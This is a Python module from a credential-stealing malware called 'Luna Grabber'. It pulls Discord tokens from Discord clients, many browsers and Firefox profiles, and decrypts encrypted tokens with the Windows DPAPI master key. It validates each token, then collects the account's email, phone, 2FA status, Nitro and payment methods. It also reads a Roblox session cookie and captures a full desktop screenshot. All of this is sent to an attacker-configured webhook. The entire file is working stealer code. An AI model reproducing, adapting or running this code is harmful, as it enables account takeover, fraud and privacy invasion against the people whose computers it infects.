import base64
import json
import os
import re
import requests
from Cryptodome.Cipher import AES
from PIL import ImageGrab
from requests_toolbelt.multipart.encoder import MultipartEncoder
from win32crypt import CryptUnprotectData

class Discord:
	def __init__(self):
		self.baseurl = "https://discord.com/api/v9/users/@me"
		self.appdata = os.getenv("localappdata")
		self.roaming = os.getenv("appdata")
		self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
		self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
		self.tokens_sent = []
		self.tokens = []
		self.ids = []

		self.grabTokens()
		self.upload(__CONFIG__["webhook"])

	def decrypt_val(self, buff, master_key):
		try:
			iv = buff[3:15]
			payload = buff[15:]
			cipher = AES.new(master_key, AES.MODE_GCM, iv)
			decrypted_pass = cipher.decrypt(payload)
			decrypted_pass = decrypted_pass[:-16].decode()
			return decrypted_pass
		except Exception:
			return "Failed to decrypt password"

	def get_master_key(self, path):
		with open(path, "r", encoding="utf-8") as f:
			c = f.read()
		local_state = json.loads(c)
		master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		master_key = master_key[5:]
		master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
		return master_key

	def grabTokens(self):
		paths = {
			'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
			'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
			'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
			'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
			'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
			'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
			'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
			'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
			'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
			'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
			'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
			'7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
			'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
			'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
			'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
			'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
			'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
			'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
			'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
			'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
			'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
			'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
			'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
			'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
			'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
			'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
			'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

		for name, path in paths.items():
			if not os.path.exists(path):
				continue
			disc = name.replace(" ", "").lower()
			if "cord" in path:
				if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
					for file_name in os.listdir(path):
						if file_name[-3:] not in ["log", "ldb"]:
							continue
						for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
							for y in re.findall(self.encrypted_regex, line):
								token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
								r = requests.get(self.baseurl, headers={
									'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
									'Content-Type': 'application/json',
									'Authorization': token})
								if r.status_code == 200:
									uid = r.json()['id']
									if uid not in self.ids:
										self.tokens.append(token)
										self.ids.append(uid)
			else:
				for file_name in os.listdir(path):
					if file_name[-3:] not in ["log", "ldb"]:
						continue
					for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
						for token in re.findall(self.regex, line):
							r = requests.get(self.baseurl, headers={
								'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
								'Content-Type': 'application/json',
								'Authorization': token})
							if r.status_code == 200:
								uid = r.json()['id']
								if uid not in self.ids:
									self.tokens.append(token)
									self.ids.append(uid)

		if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
			for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
				for _file in files:
					if not _file.endswith('.sqlite'):
						continue
					for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
						for token in re.findall(self.regex, line):
							r = requests.get(self.baseurl, headers={
								'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
								'Content-Type': 'application/json',
								'Authorization': token})
							if r.status_code == 200:
								uid = r.json()['id']
								if uid not in self.ids:
									self.tokens.append(token)
									self.ids.append(uid)

	def robloxinfo(self, webhook):
		if __CONFIG__["roblox"]:
			with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
				robo_cookie = f.read().strip()
				if robo_cookie == "No Roblox Cookies Found":
					pass
				else:
					headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
					info = None
					try:
						response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
						response.raise_for_status()
						info = response.json()
					except requests.exceptions.HTTPError:
						pass
					except requests.exceptions.RequestException:
						pass
					if info is not None:
						data = {
							"embeds": [
								{
									"title": "Roblox Info",
									"color": 5639644,
									"fields": [
										{
											"name": "<:roblox_icon:1041819334969937931> Name:",
											"value": f"`{info['UserName']}`",
											"inline": True
										},
										{
											"name": "<:robux_coin:1041813572407283842> Robux:",
											"value": f"`{info['RobuxBalance']}`",
											"inline": True
										},
										{
											"name": "🍪 Cookie:",
											"value": f"`{robo_cookie}`"
										}
									],
									"thumbnail": {
										"url": info['ThumbnailUrl']
									},
									"footer": {
										"text": "Luna Grabber | Created By Smug"
									},
								}
							],
							"username": "Luna",
							"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
						}
						requests.post(webhook, json=data)

	def upload(self, webhook):
		for token in self.tokens:
			if token in self.tokens_sent:
				continue

			val = ""
			methods = ""
			headers = {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
				'Content-Type': 'application/json',
				'Authorization': token
			}
			user = requests.get(self.baseurl, headers=headers).json()
			payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
			username = user['username']
			discord_id = user['id']
			avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
				if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
				else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
			phone = user['phone']
			email = user['email']

			mfa = "✅" if user.get('mfa_enabled') else "❌"

			premium_types = {
				0: "❌",
				1: "Nitro Classic",
				2: "Nitro",
				3: "Nitro Basic"
			}
			nitro = premium_types.get(user.get('premium_type'), "❌")

			if "message" in payment or payment == []:
				methods = "❌"
			else:
				methods = "".join(["💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else "❓" for method in payment])

			val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔐 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n'

			data = {
				"embeds": [
					{
						"title": f"{username}",
						"color": 5639644,
						"fields": [
							{
								"name": "Discord Info",
								"value": val
							}
						],
						"thumbnail": {
							"url": avatar_url
						},
						"footer": {
							"text": "Luna Grabber | Created By Smug"
						},
					}
				],
				"username": "Luna",
				"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
			}

			requests.post(webhook, json=data)
			self.tokens_sent.append(token)

		self.robloxinfo(webhook)

		image = ImageGrab.grab(
			bbox=None,
			all_screens=True,
			include_layered_windows=False,
			xdisplay=None
		)
		image.save(temp_path + "\\desktopshot.png")
		image.close()

		webhook_data = {
			"username": "Luna",
			"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
			"embeds": [
				{
					"color": 5639644,
					"title": "Desktop Screenshot",
					"image": {
						"url": "attachment://image.png"
					}
				}
			]
		}

		with open(temp_path + "\\desktopshot.png", "rb") as f:
			image_data = f.read()
			encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})

		requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)